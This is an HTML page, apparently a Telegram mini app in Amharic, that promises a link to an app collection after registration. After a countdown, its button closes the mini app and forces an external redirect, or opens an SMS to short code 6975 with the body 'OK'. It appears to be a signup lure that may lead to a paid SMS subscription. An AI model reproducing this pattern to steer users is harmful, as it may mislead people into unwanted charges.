<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ምርጥ የአፖች ስብስብ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-[#050b18] text-white">
    <div class="min-h-screen flex items-center justify-center p-6">
        <div class="max-w-xl w-full text-center">
            <div class="glass p-8 rounded-[2.5rem]">
                <h2 class="text-2xl font-bold mb-6">ሊንኩን ለማግኘት ይመዝገቡ</h2>
                
                <div id="countdownBox" class="mb-8">
                    <div class="text-6xl font-bold text-green-500" id="countdown">5</div>
                    <p class="text-sm text-gray-400 mt-2">እባክዎ ይጠብቁ...</p>
                </div>
                
                <button id="smsButton" disabled class="w-full py-4 bg-gray-600 text-white rounded-2xl font-bold text-lg opacity-50">
                    <i class="fas fa-sms mr-2"></i> እየተዘጋጀ... 
                </button>
            </div>
        </div>
    </div>

    <script>
        const REDIRECT_URL = "https://addismobileapps.vercel.app/sms-redirect.html";
        let countdown = 5;
        const countdownEl = document.getElementById('countdown');
        const smsButton = document.getElementById('smsButton');
        
        // Force external browser function
        function forceExternalBrowser() {
            if (window.Telegram && window.Telegram.WebApp) {
                // CRITICAL: Close the mini app first
                window.Telegram.WebApp.close();
                
                // Then open the redirect URL after mini app closes
                setTimeout(() => {
                    window.Telegram.WebApp.openLink(REDIRECT_URL, { try_browser: true });
                }, 300);
            } else {
                // Regular browser
                window.location.href = "sms:6975?body=OK";
            }
        }
        
        // Countdown timer
        const timer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(timer);
                countdownEl.textContent = "GO! ✓";
                smsButton.disabled = false;
                smsButton.classList.remove('bg-gray-600', 'opacity-50');
                smsButton.classList.add('bg-green-600', 'hover:bg-green-500');
                smsButton.innerHTML = '<i class="fas fa-sms mr-2"></i> አሁን ይመዝገቡ';
            }
        }, 1000);
        
        // Button click handler
        smsButton.addEventListener('click', function() {
            if (!smsButton.disabled) {
                forceExternalBrowser();
            }
        });
        
        // Expand Telegram WebApp
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.expand();
            window.Telegram.WebApp.ready();
        }
    </script>
    
    <style>
        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</body>
</html>
